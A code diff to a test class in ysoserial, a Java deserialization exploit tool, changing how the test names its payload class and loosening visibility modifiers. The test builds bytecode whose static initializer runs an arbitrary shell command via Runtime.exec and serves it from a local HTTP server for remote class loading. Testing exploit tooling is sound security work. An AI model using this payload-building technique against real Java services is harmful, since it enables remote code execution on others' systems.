@@ -20,9 +20,9 @@ import ysoserial.WrappedTest;
  */
 public class RemoteClassLoadingTest implements WrappedTest {
 
-    private int port;
+    int port;
     private String command;
-
+    private String className;
 
     /**
      * 
@@ -30,6 +30,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
     public RemoteClassLoadingTest ( String command ) {
         this.command = command;
         this.port = new Random().nextInt(65535-1024)+1024;
+        this.className = "Exploit-" + System.currentTimeMillis();
     }
 
 
@@ -39,7 +40,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
      * @see ysoserial.WrappedTest#getPayloadArgs()
      */
     public String getPayloadArgs () {
-        return String.format("http://localhost:%d/", this.port) + ":Exploit";
+        return String.format("http://localhost:%d/", this.port) + ":" + this.className;
     }
 
 
@@ -53,12 +54,12 @@ public class RemoteClassLoadingTest implements WrappedTest {
     }
 
 
-    private byte[] makePayloadClass () {
+    protected byte[] makePayloadClass () {
         try {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(Exploit.class));
             final CtClass clazz = pool.get(Exploit.class.getName());
-            clazz.setName("Exploit");
+            clazz.setName(this.className);
             clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");
             return clazz.toBytecode();
         }
@@ -68,7 +69,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
         }
     }
 
-    static final class RemoteClassLoadingTestCallable extends NanoHTTPD implements Callable<Object> {
+    static class RemoteClassLoadingTestCallable extends NanoHTTPD implements Callable<Object> {
 
         private Callable<Object> innerCallable;
         private byte[] data;
@@ -131,7 +132,7 @@ public class RemoteClassLoadingTest implements WrappedTest {
 
     }
 
-    private static class Exploit {
+    public static class Exploit {
 
     }
 }
